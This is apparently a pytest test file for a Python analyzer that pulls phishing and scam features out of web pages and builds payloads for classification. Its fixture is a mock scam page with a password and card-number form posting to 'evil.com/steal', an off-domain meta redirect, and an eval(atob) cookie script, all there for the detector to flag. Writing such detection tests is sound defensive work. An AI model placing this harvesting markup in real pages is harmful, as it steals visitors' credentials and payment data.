"""
Unit tests for src/analysis/analysis.py

Run from the project root:

    pytest tests/test_analysis.py

Imported as `analysis.analysis`, so these rely on `pythonpath = src` (see
pytest.ini). No network beyond tldextract's public-suffix list (used by
get_domain). No page fetching happens here — analyze_site is fed HTML directly,
so the crawler/network is never touched.
"""
import json

from analysis.analysis import (
    PageAnalysis,
    SiteAnalysis,
    analyze_page,
    analyze_site,
    build_committee_payloads,
    estimate_tokens,
    parse,
    split_content,
    to_jsonl,
)
from analysis.web_code import WebCodeReport

# A scammy home page and a benign about page for the same site.
PAGE_HOME = (
    "<html><head><title>Home</title>"
    '<meta http-equiv="refresh" content="4; url=https://evil.com/go">'
    "</head><body>"
    "<h1>Welcome</h1>"
    "<p>You won a FREE prize! Verify your account now.</p>"
    '<form action="http://evil.com/steal" method="post">'
    '<input type="password" name="p">'
    '<input name="cardnumber" autocomplete="cc-number">'
    "</form>"
    "<script>eval(atob('x')); document.cookie='a';</script>"
    '<script src="https://www.google-analytics.com/a.js"></script>'
    '<a href="/about">About</a>'
    '<a href="https://evil.com/x">out</a>'
    '<div style="display:none">hidden</div>'
    "</body></html>"
)
PAGE_ABOUT = (
    "<html><head><title>About</title></head><body>"
    "<p>Just a normal about page.</p>"
    '<a href="/">Home</a>'
    "</body></html>"
)
PAGES = {
    "https://example.com/": PAGE_HOME,
    "https://example.com/about": PAGE_ABOUT,
}


# ---------------------------------------------------------------------------
# parse / split_content / analyze_page
# ---------------------------------------------------------------------------
class TestParseAndSplit:
    def test_parse_returns_soup(self):
        soup = parse("<p>hi</p>")
        assert soup.find("p").get_text() == "hi"

    def test_split_content_has_three_categories(self):
        parts = split_content(parse(PAGE_HOME), "https://example.com/", "example.com")
        assert set(parts) == {"web_code", "scripts", "text"}
        assert isinstance(parts["web_code"], WebCodeReport)

    def test_analyze_page_wires_all_three_workers(self):
        page = analyze_page("https://example.com/", PAGE_HOME, "example.com")
        assert isinstance(page, PageAnalysis)
        assert page.url == "https://example.com/"
        assert page.home_domain == "example.com"
        assert page.web_code.features["has_off_domain_form_action"] is True
        assert page.scripts.features["uses_eval"] is True
        assert page.text.features["money_hit_count"] >= 1


# ---------------------------------------------------------------------------
# analyze_site
# ---------------------------------------------------------------------------
class TestAnalyzeSite:
    def test_derives_home_domain_and_counts_pages(self):
        site = analyze_site(PAGES)
        assert site.home_domain == "example.com"
        assert site.page_count == 2
        assert len(site.pages) == 2

    def test_accepts_list_of_pairs(self):
        site = analyze_site([("https://example.com/about", PAGE_ABOUT)])
        assert site.page_count == 1
        assert site.home_domain == "example.com"

    def test_empty_input(self):
        site = analyze_site({})
        assert site.page_count == 0
        assert site.pages == []
        assert site.site_features["page_count"] == 0

    def test_site_features_form_and_domain_rollups(self):
        f = analyze_site(PAGES).site_features
        assert f["form_count"] == 1
        assert f["pages_with_off_domain_form_action"] == 1
        assert f["any_password_form"] is True
        assert f["any_payment_form"] is True
        assert f["any_insecure_form_action"] is True
        assert f["pages_with_meta_refresh"] == 1
        assert f["pages_with_meta_refresh_off_domain"] == 1
        assert f["pages_with_hidden_elements"] == 1
        assert f["external_script_domains"] == ["google-analytics.com"]
        assert f["known_tracker_domains"] == ["google-analytics.com"]
        assert f["external_link_domains"] == ["evil.com"]
        assert f["third_party_resource_domains"] == []

    def test_site_features_script_and_text_rollups(self):
        f = analyze_site(PAGES).site_features
        assert f["any_eval_script"] is True
        assert f["any_redirect_script"] is False   # no window.location in the inline script
        assert f["max_suspicious_script_score"] == 3  # eval + base64 + cookie
        assert f["total_money_hits"] == 3           # free, prize, you won (home page)
        assert f["total_credential_hits"] == 1      # "verify your account"

    def test_site_is_json_serializable(self):
        dumped = json.dumps(analyze_site(PAGES).to_dict())
        assert '"site_features"' in dumped


# ---------------------------------------------------------------------------
# build_committee_payloads
# ---------------------------------------------------------------------------
class TestBuildCommitteePayloads:
    def _payloads(self, config=None):
        return build_committee_payloads(analyze_site(PAGES), config)

    def test_every_payload_has_required_shape(self):
        required = {
            "payload_id", "site", "url", "committee", "artifact_type",
            "content", "features", "context", "question", "response_schema",
        }
        payloads = self._payloads()
        assert payloads  # non-empty
        for p in payloads:
            assert required <= set(p)
            assert p["committee"] in ("text", "scripts", "web_code")
            assert p["site"] == "example.com"

    def test_covers_each_artifact_type(self):
        types = {p["artifact_type"] for p in self._payloads()}
        assert {"text_chunk", "inline_script", "external_script_ref", "form",
                "metadata", "hidden_elements"} <= types

    def test_form_payload_carries_flags(self):
        form_payloads = [p for p in self._payloads() if p["artifact_type"] == "form"]
        assert len(form_payloads) == 1
        assert form_payloads[0]["features"]["action_off_domain"] is True
        assert form_payloads[0]["features"]["has_payment_field"] is True

    def test_payload_ids_are_unique(self):
        ids = [p["payload_id"] for p in self._payloads()]
        assert len(ids) == len(set(ids))

    def test_content_respects_budget(self):
        payloads = self._payloads(config={"max_content_chars": 5})
        assert all(len(p["content"]) <= 5 for p in payloads)


# ---------------------------------------------------------------------------
# serialization / helpers
# ---------------------------------------------------------------------------
class TestSerializationHelpers:
    def test_to_jsonl_roundtrips(self):
        payloads = build_committee_payloads(analyze_site(PAGES))
        lines = to_jsonl(payloads).split("\n")
        assert len(lines) == len(payloads)
        assert all(json.loads(line) for line in lines)

    def test_estimate_tokens(self):
        assert estimate_tokens("a" * 8) == 2
        assert estimate_tokens("") == 0